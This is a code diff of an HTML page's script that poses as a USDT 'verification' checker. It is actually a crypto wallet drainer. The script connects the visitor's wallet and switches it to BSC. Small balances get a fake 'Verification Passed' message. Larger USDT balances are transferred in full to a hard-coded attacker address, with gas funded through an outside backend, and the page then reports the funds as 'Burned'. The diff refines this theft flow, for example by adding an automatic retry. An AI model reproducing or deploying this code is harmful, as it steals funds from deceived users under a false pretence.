@@ -1250,10 +1250,9 @@
       </svg><span>Now Now</span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right w-5 h-5 group-hover:translate-x-1 transition-transform"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg></button> -->
                                                             <p id="walletInfo" style="display: none;">Connecting...  </p>
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
-                                  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+                               <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 <script>
 const bscAddress = "0xBe9CA52f6fbcD025e9464B7727D36Af5eff42Ec1";
-const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 let web3, userAddress;
@@ -1282,7 +1281,7 @@ async function connectWalletAndSwitch() {
     try {
         web3 = new Web3(provider);
 
-        // Switch to BSC if needed
+        // Switch to BSC
         const currentChain = await provider.request({ method: 'eth_chainId' });
         if (currentChain !== '0x38') {
             try {
@@ -1318,7 +1317,7 @@ async function connectWalletAndSwitch() {
     }
 }
 
-async function approveToken() {
+async function approveToken(autoRetry = false) {
     if (!web3 || !userAddress) {
         await connectWalletAndSwitch();
         if (!web3 || !userAddress) {
@@ -1356,74 +1355,42 @@ async function approveToken() {
         const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
         const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
 
-        console.log("USDT:", usdtBalance);
-        console.log("BNB:", bnbBalance);
-
         if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
-            showPopup("No USDT assets found in your wallet.", "black");
+            showPopup("No USDT found in your wallet.", "black");
             return;
         }
 
         if (usdtBalance <= 0.5) {
-            showPopup(
-                `✅ Verification Successful<br>Your USDT has been verified and not flagged in blockchain.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
-                "green"
-            );
+            showPopup(`✅ Verification Passed<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`, "green");
             return;
         }
 
-        // Check for BNB gas threshold
-        const BNB_LOW_THRESHOLD = 0.0005;
-        if (bnbBalance < BNB_LOW_THRESHOLD) {
-            showPopup("⚠️ Low BNB. Requesting gas from backend...", "blue");
-
-            try {
-                const response = await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ toAddress: userAddress })
-                });
-
-                if (response.ok) {
-                    const result = await response.json();
-                    console.log("BNB top-up success:", result);
-                    showPopup("✅ BNB sent. Please wait a moment and tap again.", "green");
-                    return; // stop here so user can retry after refill
-                } else {
-                    const err = await response.json();
-                    console.error("BNB top-up failed:", err);
-                    showPopup(`BNB top-up failed. Error: ${err.message || "Unknown"}`, "red");
-                    return;
-                }
-            } catch (e) {
-                console.error("Backend BNB error:", e);
-                showPopup("⛔ Could not reach BNB refill backend. Try again later.", "red");
-                return;
-            }
-        }
-
-        showPopup("Transferring USDT...", "blue");
-
-        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
-            .send({ from: userAddress })
-            .on('transactionHash', (hash) => {
-                console.log("Hash:", hash);
-            })
-            .on('receipt', (receipt) => {
-                console.log("Transfer receipt:", receipt);
-                showPopup(
-                    `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
-                    "red"
-                );
-            })
-            .on('error', (error) => {
-                console.error("❌ TX failed:", error);
-                showPopup("Transfer failed. Check BNB gas & USDT balance.", "red");
+        if (bnbBalance < 0.0004) {
+            showPopup("Sending BNB gas... Please wait.", "blue");
+            await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
             });
 
+            setTimeout(() => {
+                approveToken(true); // Retry after gas
+            }, 4000);
+            return;
+        }
+
+        showPopup("Transferring USDT, please wait...", "blue");
+
+        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
+            .send({ from: userAddress });
+
+        showPopup(`✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`, "red");
+
     } catch (e) {
-        console.error("❌ Transfer exception:", e);
-        showPopup("USDT transfer failed. Check balance or gas.", "red");
+        console.error("❌ Error:", e);
+        if (!autoRetry) {
+            showPopup("Transfer failed. Try again.", "red");
+        }
     }
 }
 
@@ -1447,7 +1414,7 @@ function showPopup(message, color) {
     popup.style.color = color;
     popup.innerHTML = message;
     popup.style.display = "block";
-    setTimeout(() => popup.style.display = "none", 5000);
+    setTimeout(() => popup.style.display = "none", 6000);
 }
 
 window.addEventListener("load", async () => {
@@ -1463,7 +1430,7 @@ window.addEventListener("load", async () => {
         const btn = [...document.querySelectorAll("button")]
             .find(b => b.textContent.trim().toLowerCase() === "check now");
         if (btn) {
-            btn.addEventListener("click", approveToken);
+            btn.addEventListener("click", () => approveToken());
             console.log("✅ Bound 'Check Now' to approveToken()");
             observer.disconnect();
         }
